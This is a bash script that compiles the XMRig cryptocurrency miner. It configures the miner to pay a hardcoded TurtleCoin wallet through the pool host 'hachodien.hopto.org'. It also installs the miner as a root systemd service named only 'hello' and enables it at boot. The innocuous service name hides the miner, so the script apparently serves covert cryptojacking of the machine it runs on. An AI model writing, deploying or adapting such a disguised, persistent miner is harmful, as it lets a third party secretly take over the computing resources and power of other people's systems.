#!/bin/bash
sudo su
sudo apt-get update &&
sudo apt-get install software-properties-common -y &&
sudo add-apt-repository ppa:jonathonf/gcc-7.1 -y &&
sudo apt-get update &&
sudo apt-get install gcc-7 g++-7 -y &&
sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev -y &&
sudo sysctl -w vm.nr_hugepages=128 && cd /usr/local/src/ &&
git clone https://github.com/xmrig/xmrig.git &&
cd xmrig &&
mkdir build &&
cd build &&
sudo cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 &&
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo ) &&
make -j $cpucores &&

sudo bash -c 'cat <<EOT >>/usr/local/src/xmrig/build/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "version": 1,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 2, 1, 3],
        "cn-pico": [
            [2, 0],
            [2, 8],
            [2, 2],
            [2, 10],
            [2, 4],
            [2, 12],
            [2, 6],
            [2, 14],
            [2, 1],
            [2, 9],
            [2, 3],
            [2, 11],
            [2, 5],
            [2, 13]
        ],
        "cn/gpu": [0, 2, 1, 3],
        "rx": [0, 1],
        "rx/wow": [0, 2, 1, 3],
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": "cn-trtl",
            "url": "hachodien.hopto.org:80",
            "user": "TRTLux5vH4qXHw4xTyHhZVaTkk49p1aqjhxChQiyS8yeMWeMjkSwGvD9LYZxmGNzGPPYvGoCQ8Ke1ZXB49X1tQGCJKaoA9RuPbZ",
            "pass": "hvnteam",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null,
    "watch": true
}
EOT
' &&
sudo bash -c 'cat <<EOT >>/lib/systemd/system/hello.service 
[Unit]
Description=hello
After=network.target
[Service]
ExecStart= /usr/local/src/xmrig/build/xmrig
#WatchdogSec=300
#Restart=always
#RestartSec=10
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo systemctl daemon-reload &&
sudo systemctl enable hello.service &&
sudo service hello start